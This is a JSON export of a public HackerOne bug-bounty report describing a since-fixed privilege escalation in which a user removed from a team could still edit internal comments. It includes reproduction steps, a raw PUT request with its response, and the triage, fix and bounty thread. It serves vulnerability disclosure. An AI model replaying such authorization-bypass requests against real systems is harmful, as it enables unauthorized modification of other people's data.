{"id":119221,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTkyMjE=","url":"https://hackerone.com/reports/119221","title":"User with Read-Only permissions can edit the Internal comment Activities on Bug Reports After Revoke the team access permissions","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-28T03:58:04.718Z","submitted_at":"2016-02-28T03:58:04.718Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"techguynoob","url":"/techguynoob","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/507/8e42c69acb534b3ed163833960b99dfd9bc35acd_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-04-01T10:56:51.997Z","bug_reporter_agreed_on_going_public_at":"2016-04-01T10:56:51.503Z","team_member_agreed_on_going_public_at":"2016-03-09T21:51:43.695Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Poc :\n\n1.Login into Program(testbug) as Alice account\n2.Create a new group with \"Read-only\" Permission . Add a Bob to that group\n3.Bob report a bug to Program(testbug) After Post \"Some Internal comments\"\n4.Now Alice Revoke the Bob team access permissions so `Bob is no longer part of the team`\n5.Bob escalate his privileges to edit the Internal comment Activities on Bug Reports by following Request \n\nPUT /activities/815794 HTTP/1.1\nHost: hackerone.com\nConnection: close\nContent-Length: 402\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: https://hackerone.com\n\u003credacted\u003e\n\n{\"id\":815794,\"is_internal\":true,\"editable\":true,\"type\":\"Activities::Comment\",\"message\":\"bugtested\",\"markdown_message\":\"\u003cp\u003ebugtested\u003c/p\u003e\\n\",\"automated_response\":false,\"created_at\":\"2016-02-28T02:51:41.488Z\",\"updated_at\":\"2016-02-28T02:51:41.488Z\",\"actor\":{\"username\":\"Bob\",\"url\":\"https://hackerone.com/Bob\",\"profile_picture_urls\":{\"medium\":\"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png\"}}}\n\n\nResponse :\n\nHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sun, 28 Feb 2016 02:53:28 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nStatus: 200 OK\n\u003credacted\u003e\n\n{\"id\":815794,\"is_internal\":true,\"editable\":true,\"type\":\"Activities::Comment\",\"message\":\"bugtested\",\"markdown_message\":\"\\u003cp\\u003ebugtested\\u003c/p\\u003e\\n\",\"automated_response\":false,\"created_at\":\"2016-02-28T02:51:41.488Z\",\"updated_at\":\"2016-02-28T02:53:28.728Z\",\"actor\":{\"username\":\"Bob\",\"url\":\"https://hackerone.com/Bob\",\"profile_picture_urls\":{\"medium\":\"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png\"}}}\n\nRegards,\ntechguynoob","vulnerability_information_html":"\u003cp\u003ePoc :\u003c/p\u003e\n\n\u003cp\u003e1.Login into Program(testbug) as Alice account\u003cbr\u003e\n2.Create a new group with \u0026quot;Read-only\u0026quot; Permission . Add a Bob to that group\u003cbr\u003e\n3.Bob report a bug to Program(testbug) After Post \u0026quot;Some Internal comments\u0026quot;\u003cbr\u003e\n4.Now Alice Revoke the Bob team access permissions so \u003ccode\u003eBob is no longer part of the team\u003c/code\u003e\u003cbr\u003e\n5.Bob escalate his privileges to edit the Internal comment Activities on Bug Reports by following Request \u003c/p\u003e\n\n\u003cp\u003ePUT /activities/815794 HTTP/1.1\u003cbr\u003e\nHost: hackerone.com\u003cbr\u003e\nConnection: close\u003cbr\u003e\nContent-Length: 402\u003cbr\u003e\nAccept: application/json, text/javascript, \u003cem\u003e/\u003c/em\u003e; q=0.01\u003cbr\u003e\nOrigin: \u003ca title=\"https://hackerone.com\" href=\"https://hackerone.com\"\u003ehttps://hackerone.com\u003c/a\u003e\u003cbr\u003e\n\u0026lt;redacted\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;id\u0026quot;:815794,\u0026quot;is_internal\u0026quot;:true,\u0026quot;editable\u0026quot;:true,\u0026quot;type\u0026quot;:\u0026quot;Activities::Comment\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;bugtested\u0026quot;,\u0026quot;markdown_message\u0026quot;:\u0026quot;\u0026lt;p\u0026gt;bugtested\u0026lt;/p\u0026gt;\\n\u0026quot;,\u0026quot;automated_response\u0026quot;:false,\u0026quot;created_at\u0026quot;:\u0026quot;2016-02-28T02:51:41.488Z\u0026quot;,\u0026quot;updated_at\u0026quot;:\u0026quot;2016-02-28T02:51:41.488Z\u0026quot;,\u0026quot;actor\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;Bob\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u003ca title=\"https://hackerone.com/Bob%22,%22profile_picture_urls%22:%7B%22medium%22:%22/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png%22%7D%7D\" href=\"https://hackerone.com/Bob%22,%22profile_picture_urls%22:%7B%22medium%22:%22/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png%22%7D%7D\"\u003ehttps://hackerone.com/Bob%22,%22profile_picture_urls%22:%7B%22medium%22:%22/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png%22%7D%7D\u003c/a\u003e}\u003c/p\u003e\n\n\u003cp\u003eResponse :\u003c/p\u003e\n\n\u003cp\u003eHTTP/1.1 200 OK\u003cbr\u003e\nServer: cloudflare-nginx\u003cbr\u003e\nDate: Sun, 28 Feb 2016 02:53:28 GMT\u003cbr\u003e\nContent-Type: application/json; charset=utf-8\u003cbr\u003e\nConnection: close\u003cbr\u003e\nStatus: 200 OK\u003cbr\u003e\n\u0026lt;redacted\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;id\u0026quot;:815794,\u0026quot;is_internal\u0026quot;:true,\u0026quot;editable\u0026quot;:true,\u0026quot;type\u0026quot;:\u0026quot;Activities::Comment\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;bugtested\u0026quot;,\u0026quot;markdown_message\u0026quot;:\u0026quot;\\u003cp\\u003ebugtested\\u003c/p\\u003e\\n\u0026quot;,\u0026quot;automated_response\u0026quot;:false,\u0026quot;created_at\u0026quot;:\u0026quot;2016-02-28T02:51:41.488Z\u0026quot;,\u0026quot;updated_at\u0026quot;:\u0026quot;2016-02-28T02:53:28.728Z\u0026quot;,\u0026quot;actor\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;Bob\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u003ca title=\"https://hackerone.com/Bob%22,%22profile_picture_urls%22:%7B%22medium%22:%22/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png%22%7D%7D\" href=\"https://hackerone.com/Bob%22,%22profile_picture_urls%22:%7B%22medium%22:%22/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png%22%7D%7D\"\u003ehttps://hackerone.com/Bob%22,%22profile_picture_urls%22:%7B%22medium%22:%22/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png%22%7D%7D\u003c/a\u003e}\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\ntechguynoob\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-08T21:51:45.861Z","allow_singular_disclosure_after":-149063284.62751743,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":815830,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Video poc : https://youtu.be/vy5ogrEsH1s\nNote : its unlisted one\n\nRegards,\ntechguynoob\n","markdown_message":"\u003cp\u003eVideo poc : \u003ca title=\"https://youtu.be/vy5ogrEsH1s\" href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2Fvy5ogrEsH1s\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://youtu.be/vy5ogrEsH1s\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nNote : its unlisted one\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\ntechguynoob\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-28T04:31:43.440Z","updated_at":"2016-02-28T04:31:43.440Z","actor":{"username":"techguynoob","cleared":true,"url":"/techguynoob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/507/8e42c69acb534b3ed163833960b99dfd9bc35acd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":816716,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Although your test plan works, there are some prerequisites in order to make this work:\n\n- You have to capture your request manually;\n- The team manager has to remove you within 30 minutes of you placing the internal comment (that you have to have captured);\n- You have to send your request within 30 minutes of placing it, which doesn't work if a team manager removes you after 30 minutes of placing an internal comment (you have to happen to captured the request of).\n\nWe'll investigate the feasibility of this report, thanks!","markdown_message":"\u003cp\u003eAlthough your test plan works, there are some prerequisites in order to make this work:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eYou have to capture your request manually;\u003c/li\u003e\n\u003cli\u003eThe team manager has to remove you within 30 minutes of you placing the internal comment (that you have to have captured);\u003c/li\u003e\n\u003cli\u003eYou have to send your request within 30 minutes of placing it, which doesn\u0026#39;t work if a team manager removes you after 30 minutes of placing an internal comment (you have to happen to captured the request of).\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eWe\u0026#39;ll investigate the feasibility of this report, thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-29T09:42:16.799Z","updated_at":"2016-02-29T09:42:16.799Z","actor":{"username":"jens","cleared":false,"url":"/jens","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/053/9c23f98571002dd0db70919126ae92746a6af99a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":816970,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jens I know its works for limited time but I do not know the exact time of minutes . \nThanks for point out !!!","markdown_message":"\u003cp\u003e\u003ca href=\"/jens\"\u003e@jens\u003c/a\u003e I know its works for limited time but I do not know the exact time of minutes . \u003cbr\u003e\nThanks for point out !!!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-29T13:08:35.291Z","updated_at":"2016-02-29T13:12:58.436Z","actor":{"username":"techguynoob","cleared":true,"url":"/techguynoob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/507/8e42c69acb534b3ed163833960b99dfd9bc35acd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":820375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have released a fix for this issue. Can you verify if this is resolved?","markdown_message":"\u003cp\u003eWe have released a fix for this issue. Can you verify if this is resolved?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-02T09:18:03.134Z","updated_at":"2016-03-02T09:18:03.134Z","actor":{"username":"jens","cleared":false,"url":"/jens","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/053/9c23f98571002dd0db70919126ae92746a6af99a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":820396,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jens ya its now fixed !!!!\n\nRegards,\ntechguynoob","markdown_message":"\u003cp\u003e\u003ca href=\"/jens\"\u003e@jens\u003c/a\u003e ya its now fixed !!!!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\ntechguynoob\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-02T09:28:34.607Z","updated_at":"2016-03-02T09:28:34.607Z","actor":{"username":"techguynoob","cleared":true,"url":"/techguynoob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/507/8e42c69acb534b3ed163833960b99dfd9bc35acd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":820402,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Great that it's fixed now @techguynoob, thanks for your help. Please be patient while we're discussing the impact of your report.","markdown_message":"\u003cp\u003eGreat that it\u0026#39;s fixed now \u003ca href=\"/techguynoob\"\u003e@techguynoob\u003c/a\u003e, thanks for your help. Please be patient while we\u0026#39;re discussing the impact of your report.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-02T09:31:54.994Z","updated_at":"2016-03-02T09:31:54.994Z","actor":{"username":"jens","cleared":false,"url":"/jens","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/053/9c23f98571002dd0db70919126ae92746a6af99a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"techguynoob","url":"/techguynoob"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":831887,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @techguynoob,\n\nAs the chances of fulfilling the attack pre-requisites are quite low and the root cause of the vulnerability is identical to #118731, we've decided to combine the two reports for a single reward (the other report will be closed without bounty).\n\nThank you for your efforts!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/techguynoob\"\u003e@techguynoob\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAs the chances of fulfilling the attack pre-requisites are quite low and the root cause of the vulnerability is identical to \u003ca href=\"/reports/118731\"\u003e#118731\u003c/a\u003e, we\u0026#39;ve decided to combine the two reports for a single reward (the other report will be closed without bounty).\u003c/p\u003e\n\n\u003cp\u003eThank you for your efforts!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-09T21:51:27.383Z","updated_at":"2016-03-09T21:51:27.383Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"techguynoob","url":"/techguynoob"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":831888,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-09T21:51:45.351Z","updated_at":"2016-03-09T21:51:45.351Z","first_to_agree":true,"actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":882322,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-01T10:56:51.535Z","updated_at":"2016-04-01T10:56:51.535Z","actor":{"username":"techguynoob","cleared":true,"url":"/techguynoob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/507/8e42c69acb534b3ed163833960b99dfd9bc35acd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":882323,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-01T10:56:52.017Z","updated_at":"2016-04-01T10:56:52.017Z","actor":{"username":"techguynoob","cleared":true,"url":"/techguynoob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/507/8e42c69acb534b3ed163833960b99dfd9bc35acd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}